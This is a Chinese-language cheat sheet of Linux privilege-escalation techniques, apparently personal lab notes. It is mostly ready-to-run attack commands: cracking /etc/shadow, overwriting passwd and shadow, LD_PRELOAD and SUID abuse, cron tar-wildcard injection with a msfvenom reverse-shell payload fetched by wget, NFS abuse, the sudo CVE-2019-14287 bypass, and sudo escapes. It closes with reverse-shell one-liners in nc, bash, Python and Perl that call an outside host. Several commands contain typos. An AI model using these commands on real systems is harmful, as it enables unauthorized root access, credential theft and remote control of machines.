# Linux 提权

- 查看当前用户

```
    cl
```

-  查看当前目录

```
    pwd
```

- 修改交互更好的bash环境

```
    python -c "import pty;pty.spawn('/bin/bash')"
```
    
## Sudo 提权

-  枚举

```
    sudo -l
```
    
- 提权大全

    https://gtfobins.github.io/

## 可读可写 Shadow 和 Passwd 文件利用提权

- 可读 Shadow

    1. 查看权限

		```
		ls -liah /etc/pshadow
        ```
        
		![[Pasted image 20250505181903.png]]

    2. 读取 Shadow 文件

		```
		cat /etc/shadow
		```

	3. 提取特殊用户

		```
		cat /etc/shadow | grep ':\$
		```

	4.  John 破解

		```
		 sudo john hash/hash.lst --wordlist=/usr/share/wordlists/rockyou.txt
		```

- 可写 Shadow

	1. 查看权限

		```
		ls -liah /etc/shadow
		```

	2. 备份

		```
		cp /etc/shadow /tmp/shadow.bak
		```

	3. mkpasswd

		```
		mkpasswd -m sha-512 admin
		```

	4. vim修改密码

- 可写 Passwd

	1. 查看权限

		```
		ls -liah /etc/passwd
		```

	2. 读取 Passwd 文件

		```
		cat /etc/passwd
		```

	3. Openssl 创建密码

		```
		openssl passwd admin
		```
	
	4.  备份 Passwd

		```
		cp /etc/passwd /tmp/passwd.bak
		```
	
	5. 修改 x


		![[Pasted image 20250505221045.png]]

## Sudo 环境提权

1. 如果 sudo -l 有 env_keep = LD_PRELOAD

	![[Pasted image 20250505225007.png]]
	
2. 使用 C 的 root shell

3. 编译
	```
	gcc -fPIC -shared -o shell.so shell.c -nostartfiles
	```
4. 提权

	```
	sudo LD_PRELOAD=/home/user/shell.so find
	```

## 自动任务提权

- 文件权限

	1.  查看自动任务

		```
		cat /etc/crontab
		```

	![[Pasted image 20250505231657.png]]

	2.  查看 .sh 文件
		
		```
		locate overwrite.sh
		```

	3.  查看文件权限

		```
		ls -liah /usr/local/bin/overwrite.sh
		```

- PATH 环境变量提权

	1.  查看 PATH 

		```
		echo $PATH
		```

		![[Pasted image 20250505232902.png]]

	2.  查看当前目录

		```
		pwd
		```

	3. 文件赋权

		```
		chmod +xs overwrite.sh 
		```

	4. 提权

		```
		/tmp/rootbash -p
		```
	
- Tar 打包

	1.  Msfvenom 创建脚本

		```
		sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf
		```

	2.  架设临时 Web 服务器

		```
		sudo php -S 0:80 
		```

	3.  获取文件

		```
		wget http://10.10.10.5/shell.elf
		```

	4.  文件赋权

		```
		chmod +xs shell.elf
		```

	5.  利用

		```
		touch /home/user/--checkpoint=1
		```

	6.  利用

		```
		touch /home/user/--checkpoint-action=exec=shell.elf
		```

## SUID提权

- 可执行文件

```
	find / -perm -u=s -type f 2>/dev/null
	
	searchsploit exim 4.84  
	
	searchsploit exim 4.84 -m 39535 
	
	sudo php -S 0:80 
```

- 共享库注入权限

```
	/usr/local/bin/suid-so 
	
	strings /usr/local/bin/suid-so  
	
	strace /usr/local/bin/suid-so 2>&1 | grep '/home/user'  
	
	gcc -shared -fPIC -o libcalc.so libcalc
	
	/usr/local/bin/suid-so
```

- 环境变量利用提权

```
	strings /usr/local/bin/suid-env
	
	gcc -o service service.c
	
	export PATH=.:$PATH
	
	echo $PATH
	
	/usr/local/bin/suid-env

	ln -s /bin/sh cp
```


```
	echo "/bin/bash" > /tmp/id
	
	chmod 777 /tmp/id
	
	export PATH=/tmp:$PATH
	
	./toto
	
```


- bash < 4.2
	
```
	/bin/bash --version
	
	function /usr/sbin/service { /bin/bash -p; }
	
	export -f /usr/sbin/service 
```

- bash<4.4

```
	bash --version
	
	env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2  
	
	/usr/local/bin/suid-env2
```

## 历史记录

- 历史文件暴露

```
	cat ~/.*history | grep "pass"
```

- 密钥配置文件
	
```
	ls -liah
	
	cat myvpn.ovpn
	
	cat /etc/openvpn/auth.txt
```

-  SSH 密钥敏感信息提权

```
	ls -liah /`
	  `find / -name authorized_key 2>/dev/null`
	  `find / -name id_rsa 2>/dev/null`
	ls -liah /.ssh
	vim id_rsa
	chmod 600 id_rsa
	ssh -i id_rsaroot@10.10.10.12
```

## NFS 提权

```
	cat /etc/exports
	
	sudo mkdir /tmp/nfs
	
	sudo mount -o rw,vers=3 10.10.10.12:/tmp /tmp/nfs
	
	cd /tmp/nfs
	
	msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
	
	sudo chmod +xs shell.elf
```

## doad less+vi 提权
	
```
	find / -perm -u=s -type f 2>/dev/null
	
	cat /tc/doas.conf
```

## CVE-2019-14287

```
	sudo -V | grep version
	
	sudo -u#-1 /bin/bash
```

> 	该漏洞使用前提为 sudo <= 1.8.28

## Sudo 提权（全）

- sudo apt

```
	sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash
```

- sudo ash

```
	sudo ash
```
- sudo awk

```
	sudo awk 'BEGIN {system("/bin/bash")}'
```

- sudo base64

```
	ATTACT=/etc/shadow
	
	sudo base64 "$ATTACT" | base64 --decode
```

## SSH 清屏

```
export TERM=xterm-256color
```

# 获得shell

```
nc -e /bin/bash 10.10.10.5 4444

bash -c "/bin/bash -i >& /dev/tcp/10.10.10.5/4444 0>&1"

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

perl -e 'use Socket;$i="10.10.10.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```